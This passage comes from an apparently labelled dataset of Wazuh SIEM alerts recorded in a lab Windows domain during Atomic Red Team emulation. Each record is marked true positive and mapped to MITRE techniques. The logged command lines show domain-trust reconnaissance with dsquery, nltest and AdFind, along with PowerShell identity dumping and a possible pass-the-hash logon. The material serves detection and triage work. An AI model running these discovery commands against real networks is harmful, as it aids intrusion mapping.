"\\\"powershell.exe\\\" &amp; {[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\\\CurrentUserObject.txt}", "integrityLevel": "High", "fileVersion": "10.0.26100.3323 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1086,technique_name=PowerShell\r\nUtcTime: 2025-07-05 13:03:06.713\r\nProcessGuid: {ff3427f9-228a-6869-aa01-000000001500}\r\nProcessId: 2360\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.26100.3323 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"powershell.exe\" & {[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt}\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77\r\nParentProcessGuid: {ff3427f9-20c8-6869-f800-000000001500}\r\nParentProcessId: 2440\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:03:06.7240768Z", "eventRecordID": "395461", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 2, "mail": false, "description": "Powershell process spawned powershell instance", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["PowerShell"], "id": ["T1059.001"], "tactic": ["Execution"]}, "id": "92027"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720587.2199578", "timestamp": "2025-07-05T13:03:07.278+0000"}, "fields": {"timestamp": ["2025-07-05T13:03:07.278Z"]}, "sort": [1751720587278]}}
{"id": "ngpd35cBiGYaRV9X6qdH", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "ngpd35cBiGYaRV9X6qdH", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-554a-686a-6001-000000001600}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-54be-686a-f173-470000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-5574-686a-8001-000000001600}", "logonId": "0x4773f1", "parentProcessId": "4180", "processId": "7668", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-06 10:52:36.516", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"cmd.exe\\\" /c dsquery * -filter \\\"(objectClass=trustedDomain)\\\" -attr *", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-06 10:52:36.516\r\nProcessGuid: {ff3427f9-5574-686a-8001-000000001600}\r\nProcessId: 7668\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd.exe\" /c dsquery * -filter \"(objectClass=trustedDomain)\" -attr *\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-54be-686a-f173-470000000000}\r\nLogonId: 0x4773F1\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-554a-686a-6001-000000001600}\r\nParentProcessId: 4180\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-06T10:52:36.5331817Z", "eventRecordID": "634327", "threadID": "3716", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3024", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 5, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751799160.1798319", "timestamp": "2025-07-06T10:52:40.970+0000"}, "fields": {"timestamp": ["2025-07-06T10:52:40.970Z"]}, "sort": [1751799160970]}}
{"id": "oApd35cBiGYaRV9X-afy", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "oApd35cBiGYaRV9X-afy", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-554a-686a-6001-000000001600}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-54be-686a-f173-470000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-5579-686a-8301-000000001600}", "logonId": "0x4773f1", "parentProcessId": "4180", "processId": "7804", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-06 10:52:41.526", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"cmd.exe\\\" /c nltest /domain_trusts &amp; nltest /trusted_domains", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-06 10:52:41.526\r\nProcessGuid: {ff3427f9-5579-686a-8301-000000001600}\r\nProcessId: 7804\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd.exe\" /c nltest /domain_trusts & nltest /trusted_domains\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-54be-686a-f173-470000000000}\r\nLogonId: 0x4773F1\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-554a-686a-6001-000000001600}\r\nParentProcessId: 4180\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-06T10:52:41.5375137Z", "eventRecordID": "634336", "threadID": "3716", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3024", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 6, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751799165.1807048", "timestamp": "2025-07-06T10:52:45.488+0000"}, "fields": {"timestamp": ["2025-07-06T10:52:45.488Z"]}, "sort": [1751799165488]}}
{"id": "aQqQ35cBiGYaRV9X_ase", "description": "Powershell script used \"Invoke-command\" cmdlet to execute sub script", "label": "TP", "rule_level": 12, "rule_priority": "High", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "aQqQ35cBiGYaRV9X_ase", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"path": "C:\\\\AtomicRedTeam\\\\invoke-atomicredteam\\\\Private\\\\Invoke-ExecuteCommand.ps1", "messageNumber": "1", "messageTotal": "1", "scriptBlockText": "function Invoke-ExecuteCommand ($finalCommand, $executor, $executionPlatform, $TimeoutSeconds, $session = $null, $interactive) {     $null = @(         if ($null -eq $finalCommand) { return 0 }         $finalCommand = $finalCommand.trim()         Write-Verbose -Message 'Invoking Atomic Tests using defined executor'         if ($executor -eq \\\"command_prompt\\\" -or $executor -eq \\\"sh\\\" -or $executor -eq \\\"bash\\\") {             $execPrefix = \\\"-c\\\"             $execExe = $executor             if ($executor -eq \\\"command_prompt\\\") {                 $execPrefix = \\\"/c\\\";                 $execExe = \\\"cmd.exe\\\";                 $execCommand = $finalCommand -replace \\\"`n\\\", \\\" &amp; \\\"                 $arguments = $execPrefix, \\\"$execCommand\\\"             }             else {                 $finalCommand = $finalCommand -replace \\\"[\\\\\\\\](?!;)\\\", \\\"`\\\\$&amp;\\\"                 $finalCommand = $finalCommand -replace \\\"[`\\\"]\\\", \\\"`\\\\$&amp;\\\"                 $execCommand = $finalCommand -replace \\\"(?&lt;!;)\\\\n\\\", \\\"; \\\"                 $arguments = \\\"$execPrefix `\\\"$execCommand`\\\"\\\"              }         }         elseif ($executor -eq \\\"powershell\\\") {             $execCommand = $finalCommand -replace \\\"`\\\"\\\", \\\"`\\\\`\\\"`\\\"\\\"             if ($session) {                 if ($executionPlatform -eq \\\"windows\\\") {                     $execExe = \\\"powershell.exe\\\"                 }                 else {                     $execExe = \\\"pwsh\\\"                 }             }             else {                 $execExe = \\\"powershell.exe\\\"; if ($IsLinux -or $IsMacOS) { $execExe = \\\"pwsh\\\" }             }             if ($execExe -eq \\\"pwsh\\\") {                 $arguments = \\\"-Command $execCommand\\\"             }             else {                 $arguments = \\\"&amp; {$execCommand}\\\"             }         }         else {             Write-Warning -Message \\\"Unable to generate or execute the command line properly. Unknown executor\\\"             return [PSCustomObject]@{                 StandardOutput = \\\"\\\"                 ErrorOutput    = \\\"\\\"                 ExitCode       = -1                 IsTimeOut      = $false             }         }          # Write-Host -ForegroundColor Magenta \\\"$execExe $arguments\\\"         if ($session) {             $scriptParentPath = Split-Path $import -Parent             $publicPath = Join-Path (Split-Path $scriptParentPath -Parent) \\\"Public\\\"             $fp = Join-Path $scriptParentPath \\\"Invoke-Process.ps1\\\"             $fp2 = Join-Path $publicPath \\\"Invoke-KillProcessTree.ps1\\\"             invoke-command -Session $session -FilePath $fp             invoke-command -Session $session -FilePath $fp2             $res = invoke-command -Session $session -ScriptBlock { Invoke-Process -filename $Using:execExe -Arguments $Using:arguments -TimeoutSeconds $Using:TimeoutSeconds -stdoutFile \\\"art-out.txt\\\" -stderrFile \\\"art-err.txt\\\" }         }         else {             if ($interactive) {                 # This use case is: Local execution of tests that contain interactive prompts                 #   In this situation, let the stdout/stderr flow to the console                 $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds             }             else {                 # Local execution that DO NOT contain interactive prompts                 #   In this situation, capture the stdout/stderr for Invoke-AtomicTest to send to the caller                 $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds -stdoutFile \\\"art-out.txt\\\" -stderrFile \\\"art-err.txt\\\"             }         }     )     $res }", "scriptBlockId": "d0da85d0-432c-4427-b456-a5186a20a708"}, "system": {"eventID": "4104", "keywords": "0x0", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "level": "5", "channel": "Microsoft-Windows-PowerShell/Operational", "opcode": "15", "message": "\"Creating Scriptblock text (1 of 1):\r\nfunction Invoke-ExecuteCommand ($finalCommand, $executor, $executionPlatform, $TimeoutSeconds, $session = $null, $interactive) {\n    $null = @(\n        if ($null -eq $finalCommand) { return 0 }\n        $finalCommand = $finalCommand.trim()\n        Write-Verbose -Message 'Invoking Atomic Tests using defined executor'\n        if ($executor -eq \"command_prompt\" -or $executor -eq \"sh\" -or $executor -eq \"bash\") {\n            $execPrefix = \"-c\"\n            $execExe = $executor\n            if ($executor -eq \"command_prompt\") {\n                $execPrefix = \"/c\";\n                $execExe = \"cmd.exe\";\n                $execCommand = $finalCommand -replace \"`n\", \" & \"\n                $arguments = $execPrefix, \"$execCommand\"\n            }\n            else {\n                $finalCommand = $finalCommand -replace \"[\\\\](?!;)\", \"`\\$&\"\n                $finalCommand = $finalCommand -replace \"[`\"]\", \"`\\$&\"\n                $execCommand = $finalCommand -replace \"(?<!;)\\n\", \"; \"\n                $arguments = \"$execPrefix `\"$execCommand`\"\"\n\n            }\n        }\n        elseif ($executor -eq \"powershell\") {\n            $execCommand = $finalCommand -replace \"`\"\", \"`\\`\"`\"\"\n            if ($session) {\n                if ($executionPlatform -eq \"windows\") {\n                    $execExe = \"powershell.exe\"\n                }\n                else {\n                    $execExe = \"pwsh\"\n                }\n            }\n            else {\n                $execExe = \"powershell.exe\"; if ($IsLinux -or $IsMacOS) { $execExe = \"pwsh\" }\n            }\n            if ($execExe -eq \"pwsh\") {\n                $arguments = \"-Command $execCommand\"\n            }\n            else {\n                $arguments = \"& {$execCommand}\"\n            }\n        }\n        else {\n            Write-Warning -Message \"Unable to generate or execute the command line properly. Unknown executor\"\n            return [PSCustomObject]@{\n                StandardOutput = \"\"\n                ErrorOutput    = \"\"\n                ExitCode       = -1\n                IsTimeOut      = $false\n            }\n        }\n\n        # Write-Host -ForegroundColor Magenta \"$execExe $arguments\"\n        if ($session) {\n            $scriptParentPath = Split-Path $import -Parent\n            $publicPath = Join-Path (Split-Path $scriptParentPath -Parent) \"Public\"\n            $fp = Join-Path $scriptParentPath \"Invoke-Process.ps1\"\n            $fp2 = Join-Path $publicPath \"Invoke-KillProcessTree.ps1\"\n            invoke-command -Session $session -FilePath $fp\n            invoke-command -Session $session -FilePath $fp2\n            $res = invoke-command -Session $session -ScriptBlock { Invoke-Process -filename $Using:execExe -Arguments $Using:arguments -TimeoutSeconds $Using:TimeoutSeconds -stdoutFile \"art-out.txt\" -stderrFile \"art-err.txt\" }\n        }\n        else {\n            if ($interactive) {\n                # This use case is: Local execution of tests that contain interactive prompts\n                #   In this situation, let the stdout/stderr flow to the console\n                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds\n            }\n            else {\n                # Local execution that DO NOT contain interactive prompts\n                #   In this situation, capture the stdout/stderr for Invoke-AtomicTest to send to the caller\n                $res = Invoke-Process -filename $execExe -Arguments $arguments -TimeoutSeconds $TimeoutSeconds -stdoutFile \"art-out.txt\" -stderrFile \"art-err.txt\"\n            }\n        }\n    )\n    $res\n}\r\n\r\nScriptBlock ID: d0da85d0-432c-4427-b456-a5186a20a708\r\nPath: C:\\AtomicRedTeam\\invoke-atomicredteam\\Private\\Invoke-ExecuteCommand.ps1\"", "version": "1", "systemTime": "2025-07-06T11:48:19.4474205Z", "eventRecordID": "3916", "threadID": "9188", "computer": "Win11Client.soclab.internal", "task": "2", "processID": "6808", "severityValue": "VERBOSE", "providerName": "Microsoft-Windows-PowerShell"}}}, "rule": {"firedtimes": 2, "mail": true, "description": "Powershell script used \"Invoke-command\" cmdlet to execute sub script", "groups": ["windows", " powershell"], "mitre": {"technique": ["PowerShell"], "id": ["T1059.001"], "tactic": ["Execution"]}, "id": "91822"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751802508.6350223", "timestamp": "2025-07-06T11:48:28.553+0000"}, "fields": {"timestamp": ["2025-07-06T11:48:28.553Z"]}, "sort": [1751802508553]}}
{"id": "4AqV35cBiGYaRV9XMK0D", "description": "LDAP activity from Powershell process, possible remote system discovery", "label": "TP", "rule_level": 6, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "4AqV35cBiGYaRV9XMK0D", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"destinationPort": "389", "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "sourcePort": "50428", "initiated": "true", "destinationIp": "10.0.2.12", "protocol": "tcp", "processGuid": "{ff3427f9-637a-686a-0b05-000000001600}", "sourceIp": "10.0.2.14", "processId": "4596", "utcTime": "2025-07-06 11:52:29.011", "ruleName": "technique_id=T1059.001,technique_name=PowerShell", "destinationIsIpv6": "false", "user": "SOCLAB\\\\snell", "sourceIsIpv6": "false"}, "system": {"eventID": "3", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Network connection detected:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-07-06 11:52:29.011\r\nProcessGuid: {ff3427f9-637a-686a-0b05-000000001600}\r\nProcessId: 4596\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nUser: SOCLAB\\snell\r\nProtocol: tcp\r\nInitiated: true\r\nSourceIsIpv6: false\r\nSourceIp: 10.0.2.14\r\nSourceHostname: -\r\nSourcePort: 50428\r\nSourcePortName: -\r\nDestinationIsIpv6: false\r\nDestinationIp: 10.0.2.12\r\nDestinationHostname: -\r\nDestinationPort: 389\r\nDestinationPortName: -\"", "version": "5", "systemTime": "2025-07-06T11:52:34.5542083Z", "eventRecordID": "872300", "threadID": "3732", "computer": "Win11Client.soclab.internal", "task": "3", "processID": "3024", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 8, "mail": false, "description": "LDAP activity from Powershell process, possible remote system discovery", "groups": ["sysmon", "sysmon_eid3_detections", "windows"], "mitre": {"technique": ["Remote System Discovery"], "id": ["T1018"], "tactic": ["Discovery"]}, "id": "92103"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751802783.14290345", "timestamp": "2025-07-06T11:53:03.564+0000"}, "fields": {"timestamp": ["2025-07-06T11:53:03.564Z"]}, "sort": [1751802783564]}}
{"id": "4QqV35cBiGYaRV9XMK0D", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "4QqV35cBiGYaRV9XMK0D", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-60b8-686a-0404-000000001600}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-5f92-686a-d1e8-3b0200000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-6383-686a-1305-000000001600}", "logonId": "0x23be8d1", "parentProcessId": "6808", "processId": "5952", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-06 11:52:35.008", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"cmd.exe\\\" /c \\\"C:\\\\AtomicRedTeam\\\\atomics\\\\..\\\\ExternalPayloads\\\\AdFind.exe\\\"  -gcb -sc trustdmp", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "2", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-06 11:52:35.008\r\nProcessGuid: {ff3427f9-6383-686a-1305-000000001600}\r\nProcessId: 5952\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd.exe\" /c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\AdFind.exe\"  -gcb -sc trustdmp\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-5f92-686a-d1e8-3b0200000000}\r\nLogonId: 0x23BE8D1\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-60b8-686a-0404-000000001600}\r\nParentProcessId: 6808\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-06T11:52:35.0113070Z", "eventRecordID": "872305", "threadID": "3716", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3024", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 10, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751802783.14293776", "timestamp": "2025-07-06T11:53:03.625+0000"}, "fields": {"timestamp": ["2025-07-06T11:53:03.625Z"]}, "sort": [1751802783625]}}
{"id": "CAqs35cBiGYaRV9XU7DQ", "description": "Successful Remote Logon Detected - User:\\snell - NTLM authentication, possible pass-the-hash attack.", "label": "TP", "rule_level": 6, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.06", "_id": "CAqs35cBiGYaRV9XU7DQ", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"subjectLogonId": "0x0", "targetLinkedLogonId": "0x0", "impersonationLevel": "%%1833", "ipAddress": "10.0.2.8", "authenticationPackageName": "NTLM", "lmPackageName": "NTLM V2", "targetLogonId": "0x2bccec6", "logonProcessName": "NtLmSsp", "logonGuid": "{00000000-0000-0000-0000-000000000000}", "targetUserName": "snell", "keyLength": "128", "elevatedToken": "%%1842", "subjectUserSid": "S-1-0-0", "processId": "0x0", "ipPort": "48772", "targetDomainName": "SOCLAB", "targetUserSid": "S-1-5-21-3023907177-3273552708-540821291-1107", "virtualAccount": "%%1843", "logonType": "3"}, "system": {"eventID": "4624", "keywords": "0x8020000000000000", "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}", "level": "0", "channel": "Security", "opcode": "0", "message": "\"An account was successfully logged on.\r\n\r\nSubject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nLogon Information:\r\n\tLogon Type:\t\t3\r\n\tRestricted Admin Mode:\t-\r\n\tRemote Credential Guard:\t-\r\n\tVirtual Account:\t\tNo\r\n\tElevated Token:\t\tYes\r\n\r\nImpersonation Level:\t\tImpersonation\r\n\r\nNew Logon:\r\n\tSecurity ID:\t\tS-1-5-21-3023907177-3273552708-540821291-1107\r\n\tAccount Name:\t\tsnell\r\n\tAccount Domain:\t\tSOCLAB\r\n\tLogon ID:\t\t0x2BCCEC6\r\n\tLinked Logon ID:\t\t0x0\r\n\tNetwork Account Name:\t-\r\n\tNetwork Account Domain:\t-\r\n\tLogon GUID:\t\t{00000000-0000-0000-0000-000000000000}\r\n\r\nProcess Information:\r\n\tProcess ID:\t\t0x0\r\n\tProcess Name:\t\t-\r\n\r\nNetwork Information:\r\n\tWorkstation Name:\t-\r\n\tSource Network Address:\t10.0.2.8\r\n\tSource Port:\t\t48772\r\n\r\nDetailed Authentication Information:\r\n\tLogon Process:\t\tNtLmSsp \r\n\tAuthentication Package:\tNTLM\r\n\tTransited Services:\t-\r\n\tPackage Name (NTLM only):\tNTLM V2\r\n\tKey Length:\t\t128\r\n\r\nThis event is generated when a logon session is created. It is generated on the computer that was accessed.\r\n\r\nThe subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.\r\n\r\nThe logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).\r\n\r\nThe New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.\r\n\r\nThe network fields indicate where a remote logon request originated. 